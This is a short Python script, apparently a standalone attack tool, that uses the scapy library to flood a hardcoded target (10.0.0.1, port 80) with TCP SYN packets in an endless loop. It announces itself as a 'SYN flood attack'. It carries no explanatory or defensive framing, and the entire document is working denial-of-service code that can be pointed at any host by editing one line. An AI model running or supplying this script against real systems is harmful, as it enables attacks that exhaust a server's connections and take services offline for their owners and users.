import socket
import random
from scapy.all import IP, TCP, send
import sys

target_ip = "10.0.0.1"
target_port = 80

print(f"Starting SYN flood attack on {target_ip}:{target_port}")
print("Press Ctrl+C to stop")

try:
    while True:
        # Random source port
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        ip = IP(dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S')
        
        # Send packet
        send(ip/tcp, verbose=0)
        
except KeyboardInterrupt:
    print("\nAttack stopped")